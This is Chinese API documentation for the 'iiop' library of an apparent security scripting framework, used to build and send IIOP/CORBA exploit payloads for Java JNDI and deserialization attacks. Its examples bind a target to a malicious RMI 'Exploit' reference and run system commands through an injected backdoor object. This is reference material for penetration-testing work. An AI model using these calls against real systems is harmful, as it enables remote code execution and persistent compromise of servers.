# iiop {#library-iiop}

`iiop` 库用于构造与发送 IIOP/CORBA 协议的利用 Payload，常用于 Java 反序列化、JNDI 相关漏洞经 IIOP 通道的利用。

典型使用场景：

- 构造 Payload：`iiop.BindPayload` / `iiop.RebindPayload` 构造绑定/重绑定引用，`iiop.InvokePayload` 构造命令调用 Payload。
- 发送：`iiop.SendPayload(addr, payload)` 把生成的 Payload 发往目标。

与相邻库的关系：`iiop` 与 `facades`（恶意服务端）、`yso`（gadget 生成）、`java`（Java 对象构造）配合，构成 Java JNDI/反序列化利用链中的 IIOP 通道。

> 共 4 个函数

## 函数索引

|函数|参数|返回值|说明|
|:--|:--|:--|:--|
| [iiop.BindPayload](#bindpayload) | `rmi string` | `PayloadGeneraterFun` | 生成一个 IIOP bind 操作的 payload，用于向目标 CORBA/IIOP 服务绑定一个远程对象引用 |
| [iiop.InvokePayload](#invokepayload) | `backDoor string, cmd string` | `PayloadGeneraterFun` | 生成一个 IIOP 远程命令执行 payload 生成器，通过注入并调用远程后门对象执行系统命令 |
| [iiop.RebindPayload](#rebindpayload) | `rmi string` | `PayloadGeneraterFun` | 生成一个 IIOP rebind 操作的 payload，用于重新绑定（覆盖）目标服务上的远程对象引用 |
| [iiop.SendPayload](#sendpayload) | `addr string, sendPayload PayloadGeneraterFun` | `error` | 连接目标 IIOP/CORBA 服务并执行指定的 payload 生成器（如 bind、rebind、命令执行） |

## 函数详情

### BindPayload {#bindpayload}

```go
BindPayload(rmi string) PayloadGeneraterFun
```

生成一个 IIOP bind 操作的 payload，用于向目标 CORBA/IIOP 服务绑定一个远程对象引用

**参数**

|参数名|类型|说明|
|:--|:--|:--|
| rmi | `string` | 要绑定的远程对象引用地址（如 rmi/ldap 地址） |

**返回值**

|序号|类型|说明|
|:--|:--|:--|
| r1 | `PayloadGeneraterFun` | 一个 payload 生成器，配合 iiop.SendPayload 使用 |

**示例**

``````````````yak
// 通过 IIOP bind 注入远程引用，依赖目标，此处仅作示意
iiop.SendPayload("192.168.1.1:7001", iiop.BindPayload("rmi://127.0.0.1:1099/Exploit"))~
``````````````

---

### InvokePayload {#invokepayload}

```go
InvokePayload(backDoor string, cmd string) PayloadGeneraterFun
```

生成一个 IIOP 远程命令执行 payload 生成器，通过注入并调用远程后门对象执行系统命令

**参数**

|参数名|类型|说明|
|:--|:--|:--|
| backDoor | `string` | 后门对象的名称/标识 |
| cmd | `string` | 需要在目标上执行的系统命令 |

**返回值**

|序号|类型|说明|
|:--|:--|:--|
| r1 | `PayloadGeneraterFun` | 一个 payload 生成器，配合 iiop.SendPayload 使用 |

**示例**

``````````````yak
// 通过 IIOP 注入后门并执行命令，依赖目标，此处仅作示意
iiop.SendPayload("192.168.1.1:7001", iiop.InvokePayload("backdoor", "id"))~
``````````````

---

### RebindPayload {#rebindpayload}

```go
RebindPayload(rmi string) PayloadGeneraterFun
```

生成一个 IIOP rebind 操作的 payload，用于重新绑定（覆盖）目标服务上的远程对象引用

**参数**

|参数名|类型|说明|
|:--|:--|:--|
| rmi | `string` | 要重新绑定的远程对象引用地址（如 rmi/ldap 地址） |

**返回值**

|序号|类型|说明|
|:--|:--|:--|
| r1 | `PayloadGeneraterFun` | 一个 payload 生成器，配合 iiop.SendPayload 使用 |

**示例**

``````````````yak
// 通过 IIOP rebind 覆盖远程引用，依赖目标，此处仅作示意
iiop.SendPayload("192.168.1.1:7001", iiop.RebindPayload("rmi://127.0.0.1:1099/Exploit"))~
``````````````

---

### SendPayload {#sendpayload}

```go
SendPayload(addr string, sendPayload PayloadGeneraterFun) error
```

连接目标 IIOP/CORBA 服务并执行指定的 payload 生成器（如 bind、rebind、命令执行）

**参数**

|参数名|类型|说明|
|:--|:--|:--|
| addr | `string` | 目标 IIOP 服务地址，格式为 host:port |
| sendPayload | `PayloadGeneraterFun` | 由 iiop.BindPayload、iiop.RebindPayload、iiop.InvokePayload 等生成的 payload 生成器 |

**返回值**

|序号|类型|说明|
|:--|:--|:--|
| r1 | `error` | 错误信息，连接失败或执行失败时返回非空 |

**示例**

``````````````yak
// 连接目标并执行 IIOP payload，依赖目标，此处仅作示意
iiop.SendPayload("192.168.1.1:7001", iiop.InvokePayload("backdoor", "id"))~
``````````````

---

